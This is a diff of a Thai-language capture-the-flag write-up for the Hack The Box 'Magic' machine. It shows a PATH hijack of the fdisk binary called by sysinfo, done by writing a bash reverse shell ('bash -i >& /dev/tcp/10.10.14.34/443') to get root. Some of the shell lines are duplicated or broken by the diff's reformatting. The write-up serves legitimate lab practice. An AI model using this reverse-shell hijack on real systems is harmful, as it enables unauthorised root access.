@@ -108,6 +108,7 @@ ltrace sysinfo
 
 ![[Challenge/HTB Challenge/Magic/IMG/008.png]]
 
+
 โดยคำสั่ง popen เป็นการเปิดใช้งาน Process บน Linux ซึ่งจากบรรทัดดังกล่าวเป็นการเรียกใช้ fidisk ซึ่งหากไม่มีการระบุ full path นั่นหมายความว่าเราก็สามารถ Hijack Binary ได้เช่นกัน 
 
 จากนั้นทำการแทรก binary ของ fdisk ด้วย Reverse shell ดังต่อไปนี้ 
@@ -115,14 +116,20 @@ ltrace sysinfo
 theseus@magic:~$ cd /dev/shm
 cd /dev/shm
 
-theseus@magic:/dev/shm$ echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.34/443 0>&1' 
+theseus@magic:/dev/shm$ echo -e '#!/bin/bash
 
-</bash\n\nbash -i >& /dev/tcp/10.10.14.34/443 0>&1' 
+bash -i >& /dev/tcp/10.10.14.34/443 0>&1' 
+
+</bash
+
+bash -i >& /dev/tcp/10.10.14.34/443 0>&1' 
 #!/bin/bash
 
 bash -i >& /dev/tcp/10.10.14.34/443 0>&1
 
-theseus@magic:/dev/shm$ echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.34/444 0>&1'  > fdisk
+theseus@magic:/dev/shm$ echo -e '#!/bin/bash
+
+bash -i >& /dev/tcp/10.10.14.34/444 0>&1'  > fdisk
 
 
 <nbash -i >& /dev/tcp/10.10.14.34/444 0>&1'  > fdisk
@@ -141,9 +148,11 @@ theseus@magic:/dev/shm$ sysinfo
 
 ```
 
+
 และฝั่งผู้โจมตีการรอรับ  reverse shell ก็จะได้สิทธ้ root 
 
 ![[Challenge/HTB Challenge/Magic/IMG/009.png]]
 
 
 # PWNED
+```
